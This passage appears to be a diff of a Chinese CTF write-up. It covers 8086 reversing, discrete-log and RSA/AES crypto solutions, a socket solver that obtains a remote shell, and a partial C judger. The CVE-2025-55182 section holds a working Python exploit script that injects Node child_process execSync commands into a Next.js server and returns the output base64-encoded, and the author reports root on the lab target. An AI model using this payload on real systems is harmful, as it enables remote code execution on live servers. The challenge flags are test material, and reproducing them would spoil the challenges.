-    mov     ah, 0x09
-    mov     dx, off_06CF
-    int     0x21
-
-    mov     ah, 0x01
-    int     0x21
-
-.exit:
-    int     0x20
-
-off_0688:
-        db 0x76, 0x74, 0x74, 0x72, 0x64, 0x64, 0x17, 0x73, 0x72, 0x79, 0x7E, 0x72
-        db 0x73, 0x17, 0x1A, 0x17, 0x7E, 0x79, 0x61, 0x76, 0x7B, 0x7E, 0x73, 0x17
-        db 0x74, 0x7F, 0x72, 0x74, 0x7C, 0x64, 0x62, 0x7A, 0x3A, 0x3D, 0x13
-
-off_06AB:
-    db  0x33
-    db  0x3A
-    db  0x36
-    db  0x3F
-    db  0x22
-    db  0x62
-    db  0x6B
-    db  0x64
-    db  0x6B
-    db  0x01
-    db  0x2D
-    db  0x53
-    db  0x17
-    db  0x07
-    db  0x11
-    db  0x51
-    db  0x00
-    db  0x39
-    db  0x56
-    db  0x5D
-    db  0x36
-    db  0x0B
-    db  0x34
-    db  0x0E
-    db  0x2D
-    db  0x1D
-    db  0x5E
-    db  0x13
-    db  0x2E
-    db  0x01
-    db  0x18
-    db  0x45
-    db  0x19
-    db  0x1A
-    db  0x0A
-    db  0x14
-
-flag_len equ $ - off_06AB
-flag_real_len equ 35
-
-off_06CF:
-    times 64 db 0x90
-
-off_070F:
-        db 0x1A, 0x1A, 0x1A, 0x75, 0x72, 0x70, 0x7E, 0x79, 0x17, 0x71, 0x76, 0x62
-        db 0x6F, 0x17, 0x64, 0x63, 0x65, 0x62, 0x74, 0x63, 0x62, 0x65, 0x72, 0x64
-        db 0x1A, 0x1A, 0x1A
-        db 0x62, 0xBC, 0xDB, 0xB4, 0xDB, 0x27, 0x64, 0x61, 0x60, 0xBC, 0xC6
-        db 0x7A, 0x6D, 0x7F, 0x72, 0x76, 0x73, 0x72, 0x65
-    times 10 db 0x37
-        db 0x7A, 0x6D, 0xA7, 0x37, 0x34, 0x37, 0x37, 0x37
-
-    times 64 db 0x7A
-    times 48 db 0xA7
-    times 48 db 0x37
-    times 48 db 0x17
-    times 48 db 0x24
-    times 48 db 0x00
-    times 48 db 0x75
-    times 48 db 0x6D
-
-        db 0x1A, 0x1A, 0x1A, 0x72, 0x7A, 0x75, 0x72, 0x73, 0x73, 0x72, 0x73, 0x17
-        db 0x7B, 0x78, 0x70, 0x64, 0x1A, 0x1A, 0x1A, 0x3A, 0x3D
-        db 0x7B, 0x58, 0x56, 0x53, 0x7A, 0x58, 0x53, 0x42, 0x5B, 0x52, 0x0D, 0x17
-        db 0x54, 0x45, 0x4E, 0x47, 0x43, 0x58, 0x19, 0x53, 0x5B, 0x5B, 0x3A, 0x3D
-        db 0x7E, 0x59, 0x5E, 0x43, 0x64, 0x52, 0x46, 0x42, 0x52, 0x59, 0x54, 0x52
-        db 0x0D, 0x17, 0x78, 0x7C, 0x3A, 0x3D
-        db 0x62, 0x44, 0x52, 0x45, 0x0D, 0x17, 0x76, 0x73, 0x7A, 0x7E, 0x79, 0x3A
-        db 0x3D
-
-        db 0x1A, 0x1A, 0x1A, 0x72, 0x79, 0x73, 0x17, 0x71, 0x76, 0x7C, 0x72, 0x17
-        db 0x73, 0x76, 0x63, 0x76, 0x1A, 0x1A, 0x1A
-```
-
-跟着AI的思路：
-
-程序类别：
-```
-BITS 16
-ORG 100h
-```
-这是一个16位DOS`.com`程序
-
-`.com`程序默认加载到`CS:0100h`开始执行
-
-```
-off_0100:
-    push    cs
-    pop     ds
-    push    cs
-    pop     es
-```
-这里应该是~栈初始化~
-
-问了后，得知：
-```
-意思是把代码段 CS 赋给数据段 DS 和附加段 ES。因为 .COM 文件通常代码和数据都在同一个段里，所以这样做之后，程序访问 off_xxxx 数据时就能正常读写。这个是判断它“真正在初始化运行环境”的一个信号。
-```
-
-然后有一段较长但是不知所以得代码
-```
-mov     ax, 0x1337
-mov     bx, 0x0DEF
-mov     cx, 0xBEEF
-mov     dx, 0xC0DE
-mul     cx
-add     ax, bx
-ror     ax, 4
-xor     ah, 0xAB
-xor     ax, ax
-xor     bx, bx
-xor     cx, cx
-xor     dx, dx
-```
-最后都跟自己异或了，归0了
-
-再到：
-```
-    mov     al, 0x37
-
-    xchg    ax, cx
-    xchg    ax, cx
-
-    add     al, 0x13
-
-    cmp     bx, 0
-    je      .L1
-    mov     al, 0xFF
-```
-
-意思是：
-```
-al = 0x37
-al = al + 0x13 = 0x4A
-al = al ^ 0x1F = 0x55
-bl = al = 0x55
-然后跳转函数 off_063B
-```
-
-函数 off_063B:
-```
-off_063B:
-    mov     si, off_06AB
-    mov     di, off_06CF
-    mov     cx, flag_len
-
-    push    bx
-    push    ax
-    pop     bx
-    pop     ax
-    xchg    ax, bx
-
-.decode_loop:
-    lodsb
-
-    push    ax
-    pop     ax
-
-    xor     al, bl
-    stosb
-
-    inc     bl
-
-    cmp     ax, 0
-    lahf
-    sahf
-
-    loop    .decode_loop
-
-    mov     si, off_06CF
-    mov     cx, flag_real_len
-    xor     al, al
-
-.verify_loop:
-    xor     al, [si]
-    inc     si
-    loop    .verify_loop
-
-    cmp     al, [si]
-    je      .valid
-
-    mov     ah, 0x09
-    mov     dx, off_0688
-    int     0x21
-    jmp     .exit
-
-.valid:
-    mov     byte [off_06CF + flag_real_len], '$'
-    mov     ah, 0x09
-    mov     dx, off_06CF
-    int     0x21
-
-    mov     ah, 0x01
-    int     0x21
-
-.exit:
-    int     0x20
-```
-
-开头三行代码暴露了数据：
-```
-SI = 源数据地址 ==> off_06AB 密文区
-DI = 目标缓冲区地址 ==> off_06CF 解密输出缓冲区
-CX = 循环次数 ==> flag_len 解密长度
-```
-
-密文：
-```
-off_06AB:
-    db  0x33
-    db  0x3A
-    db  0x36
-    db  0x3F
-    db  0x22
-    db  0x62
-    db  0x6B
-    db  0x64
-    db  0x6B
-    db  0x01
-    db  0x2D
-    db  0x53
-    db  0x17
-    db  0x07
-    db  0x11
-    db  0x51
-    db  0x00
-    db  0x39
-    db  0x56
-    db  0x5D
-    db  0x36
-    db  0x0B
-    db  0x34
-    db  0x0E
-    db  0x2D
-    db  0x1D
-    db  0x5E
-    db  0x13
-    db  0x2E
-    db  0x01
-    db  0x18
-    db  0x45
-    db  0x19
-    db  0x1A
-    db  0x0A
-    db  0x14
-```
-
-然后需要找解密的方法：
-```
-.decode_loop:
-    lodsb           // mov al, [si] 从DS:SI指向的位置读取1字节到AL
-                    // inc si       SI++
-
-    push    ax
-    pop     ax
-
-    xor     al, bl  // AL = AL ^ BL
-                    // 如：明文[0] = 密文[0] ^ 0x55 ==> 0x33 ^ 0x55 = 0x66 = 'f'
-    stosb           // mov [di], al 将AL写到ES:DI的位置
-                    // inc di    DI++
-                    // 解密的结果会放入 off_06CF
-    inc     bl      // 每解一个字节,key++
-
-    cmp     ax, 0
-    lahf
-    sahf
-
-    loop    .decode_loop
-```
-
-
-Python代码：
-```
-enc = [
-    0x33, 0x3A, 0x36, 0x3F, 0x22, 0x62, 0x6B, 0x64,
-    0x6B, 0x01, 0x2D, 0x53, 0x17, 0x07, 0x11, 0x51,
-    0x00, 0x39, 0x56, 0x5D, 0x36, 0x0B, 0x34, 0x0E,
-    0x2D, 0x1D, 0x5E, 0x13, 0x2E, 0x01, 0x18, 0x45,
-    0x19, 0x1A, 0x0A, 0x14
-]
-
-key = 0x55
-out = []
-
-for b in enc:
-    out.append(b ^ key)
-    key = (key + 1) & 0xff
-
-print(bytes(out))
-print(bytes(out[:35]).decode())
-```
 
 flag
 ```
-flag{8086_r3ver5e_15_a_b@s1c_sk1ll}
-```
-
-## dlp
-
-题目:
-```python
-from Crypto.Util.number import *
-import math
-
-
-m = bytes_to_long(flag)
-n = 12658496303201581987904413378231672705848324463557650748242993254944407255926163828010653564020917857620982783176641954529909922267412737349457807433073478956716588664201001
-print(pow(7,m,n))
-
-'''
-965034179468698868811585108402708910494957686334522514089846951965123540637986716168374511689067098771159300199946023700677529514020404560754430727137920456537319123516664
-'''
-```
-
-~不会做，扔给ai，啊，看题解吓哭了:~
-
-~ChatGPT:~
-
-~注意到n的特殊性：~
-
-~n = p^5 * q~
-
-~其中：~
-
-~p = 10532208912748542707~
-
-~q = 97675309052127525561124163779796696566431155872900589821544185613370103125443~
-
-~不是哥们儿......~
-
-还是稍微学一点吧：
-
-题目最终目的就是解出m的值，这是一个离散数对问题
-
-AI指出，先检查n是否为素数，如果是，就看n-1的分解，然后使用Pohlig-Hellman
-
-但是这里发现n是合数，使用factorint(n)后为 
-
-n = p^5 * q
-
-其中：
-
-p = 10532208912748542707
-
-q = 97675309052127525561124163779796696566431155872900589821544185613370103125443
-
-好吧，这次来源正常一点了。
-
-于是题目可以拆解为
-
-```
-(1) 7^m ≡ c mod p^5
-(2) 7^m ≡ c mod q
-```
-
-对于 (2):
-
-factorint(q - 1)可以分界处很多较小的因子
-
-于是有：
-
-```
-xq = discrete_log(q, c % q, 7)
-m ≡ xq mod q - 1
-```
-
-对于 (1):
-
-使用 p-adic log:
-```
-先求：
-7^x0 ≡ c mod p
-
-再设：
-m = x0 + (p - 1)t
-```
-
-之后对(1),(2)使用CRT合并，再进行解码得到结果：
-
-脚本：
-```
-import sympy as sp
-from math import lcm
-from sympy.ntheory.modular import crt
-
-n = 12658496303201581987904413378231672705848324463557650748242993254944407255926163828010653564020917857620982783176641954529909922267412737349457807433073478956716588664201001
-
-c = 965034179468698868811585108402708910494957686334522514089846951965123540637986716168374511689067098771159300199946023700677529514020404560754430727137920456537319123516664
-
-g = 7
-
-p = 10532208912748542707
-q = 97675309052127525561124163779796696566431155872900589821544185613370103125443
-
-assert n == p**5 * q
-
-
-def padic_log_1p(u, p, e):
-    """
-    计算 log(u) mod p^e
-    要求 u ≡ 1 mod p
-    """
-    mod = p ** e
-    z = (u - 1) % mod
-
-    s = 0
-    term = 1
-
-    for k in range(1, e):
-        term = (term * z) % mod
-        val = term * pow(k, -1, mod)
-
-        if k & 1:
-            s = (s + val) % mod
-        else:
-            s = (s - val) % mod
-
-    return s % mod
-
-
-# -----------------------------
-# 1. 解 mod p^5
-# -----------------------------
-
-modp5 = p ** 5
-
-# 先在 mod p 下求 x0
-x0 = sp.discrete_log(p, c % p, g % p)
-
-# 设 m = x0 + (p - 1)t
-a = pow(g, p - 1, modp5)
-b = (c % modp5) * pow(pow(g, x0, modp5), -1, modp5) % modp5
-
-# a^t ≡ b mod p^5
-# 取 p-adic log
-La = padic_log_1p(a, p, 5)
-Lb = padic_log_1p(b, p, 5)
-
-# La 和 Lb 都能被 p 整除，所以除掉一个 p
-t = ((Lb // p) * pow(La // p, -1, p ** 4)) % (p ** 4)
-
-xp = x0 + (p - 1) * t
-ord_p5 = sp.n_order(g, modp5)
-
-assert pow(g, xp, modp5) == c % modp5
-
-
-# -----------------------------
-# 2. 解 mod q
-# -----------------------------
-
-xq = sp.discrete_log(q, c % q, g % q)
-ord_q = sp.n_order(g, q)
-
-assert pow(g, xq, q) == c % q
-
-
-# -----------------------------
-# 3. CRT 合并
-# -----------------------------
-
-m, mod = crt([ord_p5, ord_q], [xp, xq])
-m = int(m)
-
-assert pow(g, m, n) == c
-
-flag = m.to_bytes((m.bit_length() + 7) // 8, "big")
-print(flag)
-```
-
-
-
-
-## 入
-
-题目給了一个zako.zo程序，搜索后缀，是一种Racket语言编写的程序
-
-尝试根据AI提示搜索String:
-
-![字符串](./reverse/zako/strings.png)
-
-尝试安装Racket运行，但是失败了，于是拿到winhex里面分析,这是看到了一些可疑字符串，其中那个r1ckY字符串没有出现在之前的String里，于是我怀疑那是一个Racket编译产物中特殊的字符串，也有可能是故意隐藏的字符串
-
-![winhex](./reverse/zako/flag.png)
-
-提取后得到：
-```
-flag{r1ckY_15_4_n3k0!}
-```
-提交后失败，然后开始交给AI分析：
-
-
-
-flag{h4j1Ml_L@0wU_l4OWv_j1#o_jI@O_Je0vv_kx7_HA!}
-from pathlib import Path
-
-key = b"r1ckY_15_4_n3k0!"
-
-ct = bytes([
-    0xa3, 0xc0, 0xfc, 0xb3, 0xc8, 0xd6, 0xfa, 0xba,
-    0x65, 0x39, 0x26, 0x88, 0xc4, 0x99, 0x3f, 0x2a,
-    0x65, 0xbb, 0x75, 0x0a, 0x7a, 0x12, 0xac, 0xe3,
-    0xa0, 0x15, 0x32, 0x4c, 0xe9, 0x2d, 0xc4, 0xd6,
-    0x91, 0xf6, 0x0a, 0x9d, 0x92, 0xa3, 0x57, 0x51,
-    0x22, 0xf7, 0xf0, 0x81, 0x55, 0xa9, 0xba, 0x87,
-    0x21, 0x13, 0xf9, 0x49, 0xca, 0x02, 0x8f, 0x41,
-])
-
-DELTA = 0x9E3779B9
-MASK = 0xFFFFFFFF
-
-def u32be(b):
-    return int.from_bytes(b, "big")
-
-def p32be(x):
-    return x.to_bytes(4, "big")
-
-def tea_decrypt_block(v0, v1, k):
-    s = (DELTA * 32) & MASK
-    for _ in range(32):
-        v1 = (v1 - (((v0 << 4) + k[2]) ^ (v0 + s) ^ ((v0 >> 5) + k[3]))) & MASK
-        v0 = (v0 - (((v1 << 4) + k[0]) ^ (v1 + s) ^ ((v1 >> 5) + k[1]))) & MASK
-        s = (s - DELTA) & MASK
-    return v0, v1
-
-k = [u32be(key[i:i+4]) for i in range(0, 16, 4)]
-
-out = b""
-for i in range(0, len(ct), 8):
-    v0 = u32be(ct[i:i+4])
-    v1 = u32be(ct[i+4:i+8])
-    a, b = tea_decrypt_block(v0, v1, k)
-    out += p32be(a) + p32be(b)
-
-print(out)
-print(out.rstrip(bytes([out[-1]])).decode())
-
-
-## 我是谁?
-
-题目给了一个网址：https://bili33.top/GDUTCSCTF2026-whoami-Cheatsheet，并且指出这个是题目答案。
-
-然后再链接一下靶机，输出了一下内容：
-![连接靶机](./misc/whoami/link_01.png)
-
-这貌似是要根据输出的一长串内容，解码出是那个图片，然后回答图片的名字
-
-经过尝试，这是一个 base(zlib(svg)) 编码过的图片。
-
-那只需要将网站上所有图片的svg下载下来，编码过后存储为字符串，然后连接靶机后根据靶机的字符串匹配即可回答问题。
-
-脚本：
-```python
-import socket
-import base64
-import zlib
-import re
-import urllib.request
-import hashlib
-import sys
-import threading
-import time
-
-HOST = "ctf-2.xeed.run"
-PORT = 32336
-
-logos = {
-    "android": "Android",
-    "arch": "Arch",
-    "centos": "CentOS",
-    "chromeos": "ChromeOS",
-    "debian": "Debian",
-    "fedora": "Fedora",
-    "kali": "Kali",
-    "macos": "MacOS",
-    "mint": "Mint",
-    "nixos": "NixOS",
-    "opensuse": "OpenSUSE",
-    "redhat": "Redhat",
-    "ubuntu": "Ubuntu",
-    "windows": "Windows",
-}
-
-BASE_URL = "https://bili33.top/img/logo/{}.svg"
-
-
-def norm(data: bytes) -> bytes:
-    return re.sub(rb"\s+", b" ", data.strip())
-
-
-def sha(data: bytes) -> str:
-    return hashlib.sha256(data).hexdigest()
-
-
-def download_svg(name: str) -> bytes:
-    url = BASE_URL.format(name)
-    req = urllib.request.Request(
-        url,
-        headers={"User-Agent": "Mozilla/5.0"}
-    )
-    return urllib.request.urlopen(req, timeout=10).read()
-
-
-def build_refs():
-    """
-    refs_exact:
-        base64(zlib(svg)) -> answer
-
-    refs_svg:
-        sha256(svg) -> answer
-        这是备用匹配，防止压缩字符串不完全一致。
-    """
-    refs_exact = {}
-    refs_svg = {}
-
-    for name, answer in logos.items():
-        svg = download_svg(name)
-
-        # 方案一：你说的 base64(zlib(svg)) 字符串匹配
-        encoded = base64.b64encode(zlib.compress(svg)).decode()
-        refs_exact[encoded] = answer
-
-        # 方案二：备用，解压后比较 SVG 内容
-        refs_svg[sha(svg)] = answer
-        refs_svg[sha(svg.strip())] = answer
-        refs_svg[sha(norm(svg))] = answer
-
-        print(f"[+] loaded {answer}")
-
-    return refs_exact, refs_svg
-
-
-def extract_token(text: str):
-    """
-    从题目文本里提取那一大段 base64。
-    """
-    m = re.search(
-        r"=== Tell me whoami ===\s*([A-Za-z0-9+/=]{80,})\s*Your answer >>",
-        text,
-        re.S
-    )
-    if m:
-        return m.group(1)
-
-    # 备用：直接找一段很长的 base64
-    candidates = re.findall(r"[A-Za-z0-9+/=]{80,}", text)
-    if candidates:
-        return candidates[-1]
-
-    return None
-
-
-def solve_token(token: str, refs_exact: dict, refs_svg: dict):
-    # 第一优先：直接字符串匹配
-    if token in refs_exact:
-        return refs_exact[token]
-
-    # 第二优先：尝试补齐 base64 后解码、解压，再匹配 SVG
-    try:
-        fixed = token + "=" * ((4 - len(token) % 4) % 4)
-        raw = base64.b64decode(fixed)
-        svg = zlib.decompress(raw)
-
-        for item in [svg, svg.strip(), norm(svg)]:
-            h = sha(item)
-            if h in refs_svg:
-                return refs_svg[h]
-
-        print("[!] decoded SVG, but no match")
-        print(svg[:200].decode(errors="ignore"))
-
-    except Exception as e:
-        print("[!] decode failed:", e)
-
-    return None
-
-
-def interactive(sock: socket.socket):
-    """
-    如果最后启动了 shell，用这个函数接管交互。
-    """
-    def recv_loop():
-        while True:
-            try:
-                data = sock.recv(4096)
-                if not data:
-                    break
-                print(data.decode(errors="ignore"), end="")
-            except Exception:
-                break
-
-    t = threading.Thread(target=recv_loop, daemon=True)
-    t.start()
-
-    while True:
-        try:
-            line = input()
-            sock.sendall(line.encode() + b"\n")
-        except EOFError:
-            break
-        except KeyboardInterrupt:
-            break
-
-
-def main():
-    refs_exact, refs_svg = build_refs()
-
-    s = socket.create_connection((HOST, PORT), timeout=10)
-    s.settimeout(3)
-
-    buf = b""
-
-    while True:
-        try:
-            data = s.recv(65536)
-        except socket.timeout:
-            continue
-
-        if not data:
-            break
-
-        buf += data
-        text = buf.decode(errors="ignore")
-        print(text, end="")
-
-        if "Your answer >>" in text:
-            token = extract_token(text)
-
-            if not token:
-                print("\n[-] no token found")
-                break
-
-            ans = solve_token(token, refs_exact, refs_svg)
-
-            if ans is None:
-                print("\n[-] no answer found")
-                break
-
-            print(f"\n[+] answer = {ans}")
-            s.sendall(ans.encode() + b"\n")
-            buf = b""
-
-        elif "Your command >>" in text:
-            print("\n[+] game passed")
-            cmd = "sh"
-
-            print(f"[+] send command: {cmd}")
-            s.sendall(cmd.encode() + b"\n")
-
-            interactive(s)
-            break
-
-if __name__ == "__main__":
-    main()
-```
-
-运行后在命令行端尝试ls,chat ./flag等命令，最后使用env | grep -i flag找出来flag了
-
-![flag](./misc/whoami/flag-whoami.png)
-
-flag:
-```
-flag{7489925c-6bdd-4ad1-bb20-eb3751524c1b}
-```
-
-
-## double_crypto
-
-题目：
-```python
-#caesar_13_iv
-import os
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes
-import random
-
-script_dir = os.path.dirname(os.path.abspath(__file__))
-output_path = os.path.join(script_dir, "encrypted_params.txt")
-
-p = getPrime(128)
-q = getPrime(128)
-n = p * q
-e = 65537
-phi = (p - 1) * (q - 1)
-d = pow(e, -1, phi)
-
-print(f"[RSA] n = {n}")
-print(f"[RSA] e = {e}")
-
-m = bytes_to_long(flag)
-c_rsa = pow(m, e, n)
-print(f"[RSA] c_rsa = {c_rsa}")
-
-c_rsa_bytes = long_to_bytes(c_rsa, (n.bit_length() + 7) // 8)
-aes_key = random.randbytes(16)
-iv = random.randbytes(16)
-cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
-padded_data = pad(c_rsa_bytes, AES.block_size)
-c_aes = cipher_aes.encrypt(padded_data)
-
-print(f"[AES] key = {aes_key.hex()}")
-print(f"[AES] iv  = {iv.hex()}")
-print(f"[AES] ct  = {c_aes.hex()}")
-
-# n = 108460347539116548233850259329362939266582518558734624388997849930646568128401
-# key = 8c0c5db5efdd4505b1cd88569b6bf8f5
-# IV  = 6144s1oo1s1p7osq442p6qsr5733701p
-# ciphertext = 0ffb5c8356bf6a0ea8e541fbc7f27aa00095f302dbc27b7e4842a500cfd9767b16c9fc8f7a8d420e8bd604b727a363fb
-```
-
-破译脚本：
-```python
-import codecs
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
-from Crypto.Util.number import long_to_bytes
-
-n = 108460347539116548233850259329362939266582518558734624388997849930646568128401
-e = 65537
-
-key_hex = "8c0c5db5efdd4505b1cd88569b6bf8f5"
-iv_obf = "6144s1oo1s1p7osq442p6qsr5733701p"
-ct_hex = "0ffb5c8356bf6a0ea8e541fbc7f27aa00095f302dbc27b7e4842a500cfd9767b16c9fc8f7a8d420e8bd604b727a363fb"
-
-# 1. ROT13 还原 IV
-iv_hex = codecs.decode(iv_obf, "rot_13")
-print("[+] iv_hex =", iv_hex)
-
-key = bytes.fromhex(key_hex)
-iv = bytes.fromhex(iv_hex)
-ct = bytes.fromhex(ct_hex)
-
-# 2. AES-CBC 解密
-cipher = AES.new(key, AES.MODE_CBC, iv)
-c_rsa_bytes = unpad(cipher.decrypt(ct), 16)
-c_rsa = int.from_bytes(c_rsa_bytes, "big")
-
-print("[+] c_rsa_bytes =", c_rsa_bytes.hex())
-print("[+] c_rsa =", c_rsa)
-
-# 3. 填入分解出的 p, q
-p = 319604865451981917438227037590936720137
-q = 339357623313190301253627442856667763273
-
-if p and q:
-    phi = (p - 1) * (q - 1)
-    d = pow(e, -1, phi)
-
-    m = pow(c_rsa, d, n)
-    flag = long_to_bytes(m)
-
-    print("[+] flag =", flag)
-else:
-    print("[!] 先分解 n，得到 p 和 q 后填入脚本。")
-```
-
-flag:
-![flag](./crypto/double-crypto/flag.png)
-```
-flag{crypto_1s_fun}
-```
-
-
-## CVE-2025-55182
-
-这里先查询了相关漏洞信息：[CVE-2025-55182的原理与复现](https://www.cnblogs.com/hzhsec/p/19412603)，然后明确最终目的：在远程靶机上实现命令执行。
-
-首先用浏览器和curl访问靶机
-
-![curl](./web/CVE/web_code.png)
-
-![web](./web/CVE/boundary.png)
-
-其中浏览器中有提示：尝试从.Git目录泄露的数据中查找信息
-
-根据漏洞信息写脚本：
-```python
-#!/usr/bin/env python3
-import base64
-import json
-import re
-import sys
-from urllib.parse import unquote
-
-import requests
-
-
-BOUNDARY = "----ofofwawaofofjijihghgnbBNgVqwwn3wzu78"
-
-
-def make_body(fields):
-    body = b""
-    for name, value in fields.items():
-        body += f"--{BOUNDARY}\r\n".encode()
-        body += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
-        body += value.encode()
-        body += b"\r\n"
-    body += f"--{BOUNDARY}--\r\n".encode()
-    return body
-
-
-def build_body(cmd: str):
-    js_cmd = json.dumps(cmd)
-
-    prefix = (
-        "var cp=process.mainModule.require('child_process');"
-        f"var res=cp.execSync({js_cmd},{{timeout:8000}}).toString();"
-        "var b=Buffer.from(res).toString('base64');"
-        "throw Object.assign(new Error('NEXT_REDIRECT'),"
-        "{digest:'NEXT_REDIRECT;push;/x?o='+b+';307;'});"
-    )
-
-    chunk = {
-        "then": "$1:__proto__:then",
-        "status": "resolved_model",
-        "reason": -1,
-        "value": "{\"then\":\"$B1337\"}",
-        "_response": {
-            "_prefix": prefix,
-            "_formData": {
-                "get": "$1:constructor:constructor"
-            }
-        }
-    }
-
-    fields = {
-        "0": json.dumps(chunk, separators=(",", ":")),
-        "1": "\"$@0\"",
-    }
-
-    return make_body(fields)
-
-
-def decode_output(resp):
-    data = "\n".join([
-        resp.headers.get("X-Action-Redirect", ""),
-        resp.headers.get("Location", ""),
-        resp.text,
-    ])
-
-    m = re.search(r"[?&]o=([^;\s\"'<>]+)", data)
-    if m:
-        raw = unquote(m.group(1))
-        return base64.b64decode(raw + "=" * (-len(raw) % 4)).decode("utf-8", "replace")
-
-    return data[:3000]
-
-
-def run(base_url, cmd):
-    url = base_url.rstrip("/") + "/"
-    body = build_body(cmd)
-
-    r = requests.post(
-        url,
-        headers={
-            "User-Agent": "Mozilla/5.0",
-            "Next-Action": "x",
-            "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
-        },
-        data=body,
-        timeout=15,
-        allow_redirects=False,
-    )
-
-    print("[status]", r.status_code)
-    print(decode_output(r))
-
-
-if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print(f'Usage: {sys.argv[0]} http://host:port "id"')
-        sys.exit(1)
-
-    run(sys.argv[1], " ".join(sys.argv[2:]))
-```
-
-可以看到拿到了root权限了：
-![root](./web/CVE/root.png)
-
-然后继续查找flag并读取
-![flag](./web/CVE/flag.png)
-
-
-## 猜猜数字喵
-
-题目代码：
-```c
-#define _GNU_SOURCE
-#include <err.h>
-#include <fcntl.h>
-#include <sched.h>
-#include <signal.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/capability.h>
-#include <sys/prctl.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <unistd.h>
-
-typedef uint64_t randval_t;
-
-typedef struct main_context_t {
-    int   pfd[2];
-    pid_t pid;
-} main_context_t;
-
-typedef struct medium_context_t {
-    int   outfd[2];
-    pid_t pid;
-} medium_context_t;
-
-typedef struct config_t { 
-    size_t count; // 次数
-    char*  exe;   // 执行程序名
-} config_t; 
-
-static const config_t* getcfg() {
-    static config_t config = {.count = 32, .exe = "./sol"};
-    static bool     init = false;
-
-    char* buf;
-
-    if (!init) {
-        buf = getenv("JUDGER_COUNT");
-        if (buf != NULL) config.count = atoll(buf);
-
-        buf = getenv("JUDGER_EXE");
-        if (buf != NULL) config.exe = buf;
-    }
-
-    return &config;
-}
-
-static randval_t getrand() {
-    randval_t val;
-
-    FILE*  fp;
-    size_t ret;
-
-    fp = fopen("/dev/urandom", "r");
-    if (fp == NULL) err(EXIT_FAILURE, "fopen");
-
-    ret = fread(&val, sizeof(val), 1, fp);
-    if (ret != 1) {
-        fprintf(stderr, "fread() failed: %zu\n", ret);
-        exit(EXIT_FAILURE);
-    }
-
-    fclose(fp);
-
-    return val;
-}
-
-static void judger(const main_context_t* const ctx,
-                   const randval_t* const      expect) {
-    ssize_t nread;
-
-    randval_t actual;
-
-    if (close(ctx->pfd[1]) == -1) err(EXIT_FAILURE, "close");
-
-    nread = read(ctx->pfd[0], &actual, sizeof(actual));
-    if (nread < 0) err(EXIT_FAILURE, "read");
-    if (nread != sizeof(actual)) {
-        fprintf(stderr, "read() failed: %zd\n", nread);
-        exit(EXIT_FAILURE);
-    }
-
-    if (actual != *expect) {
-        fprintf(stderr, "judge: Number not matched.\n");
-        exit(EXIT_FAILURE);
-    }
-
-    if (close(ctx->pfd[0]) == -1) err(EXIT_FAILURE, "close");
-}
-
-static void proxy(const main_context_t* const   mainctx,
-                  const medium_context_t* const proxyctx) {
-    ssize_t   cnt;
-    randval_t val;
-
-    if (close(mainctx->pfd[0]) == -1) err(EXIT_FAILURE, "close");
-    if (close(proxyctx->outfd[1]) == -1) err(EXIT_FAILURE, "close");
-
-    cnt = read(proxyctx->outfd[0], &val, sizeof(val));
-    if (cnt < 0) err(EXIT_FAILURE, "read");
-    if (cnt != sizeof(val)) {
-        fprintf(stderr, "read() failed: %zd\n", cnt);
-        exit(EXIT_FAILURE);
-    }
-
-    cnt = write(mainctx->pfd[1], &val, sizeof(val));
-    if (cnt < 0) err(EXIT_FAILURE, "write");
-    if (cnt != sizeof(val)) {
-        fprintf(stderr, "write() failed: %zd\n", cnt);
-        exit(EXIT_FAILURE);
-    }
-
-    if (close(mainctx->pfd[1]) == -1) err(EXIT_FAILURE, "close");
-    if (close(proxyctx->outfd[0]) == -1) err(EXIT_FAILURE, "close");
-
-    exit(EXIT_SUCCESS);
-}
-
-static void userprog(const medium_context_t* const ctx) {
-    const config_t* cfg;
-
-    int nullfd;
-
-    int ret;
-
-    char* argv[2];
-    char* envp[1];
-
-    cfg = getcfg();
-
-    if (close(ctx->outfd[0]) == -1) err(EXIT_FAILURE, "close");
-    if (dup2(ctx->outfd[1], STDOUT_FILENO) == -1) err(EXIT_FAILURE, "dup2");
-    if (close(ctx->outfd[1]) == -1) err(EXIT_FAILURE, "close");
-
-    nullfd = open("/dev/null", O_RDONLY);
-    if (nullfd == -1) err(EXIT_FAILURE, "open");
-    if (dup2(nullfd, STDIN_FILENO) == -1) err(EXIT_FAILURE, "dup2");
-    if (close(nullfd) == -1) err(EXIT_FAILURE, "close");
-
-    memcpy(argv, (typeof(argv)){cfg->exe, NULL}, sizeof(argv));
-    envp[0] = NULL;
-
-    ret = execve(cfg->exe, argv, envp);
-    if (ret == -1) err(EXIT_FAILURE, "execve");
-}
-
-static void isolate() {
-    int ret;
-
-    cap_t       caps;
-    cap_value_t cap_list[1];
-
-    ret = unshare(CLONE_NEWUSER);
-    if (ret == -1) err(EXIT_FAILURE, "unshare");
-
-    caps = cap_get_proc();
-    if (caps == NULL) err(EXIT_FAILURE, "cap_get_proc");
-
-    cap_list[0] = CAP_SYS_PTRACE;
-    if (cap_set_flag(caps, CAP_INHERITABLE, 1, cap_list, CAP_SET) == -1)
-        err(EXIT_FAILURE, "cap_set_flag");
-    if (cap_set_proc(caps) == -1) err(EXIT_FAILURE, "cap_set_proc");
-    if (cap_free(caps) == -1) err(EXIT_FAILURE, "cap_free");
-
-    if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, CAP_SYS_PTRACE, 0, 0) == -1)
-        err(EXIT_FAILURE, "prctl");
-}
-
-static void medium(const main_context_t* const mainctx) {
-    int ret;
-
-    medium_context_t proxyctx;
-
-    isolate();
-
-    ret = pipe(proxyctx.outfd);
-    if (ret == -1) err(EXIT_FAILURE, "pipe");
-
-    proxyctx.pid = fork();
-    switch (proxyctx.pid) {
-        case -1:
-            err(EXIT_FAILURE, "fork");
-        case 0:
-            proxy(mainctx, &proxyctx);
-        default:
-            userprog(&proxyctx);
-    }
-
-    exit(EXIT_SUCCESS);
-}
-
-static void waitall() { while (wait(NULL) != -1); }
-
-int main() {
-    const config_t* cfg; // 配置文件
-
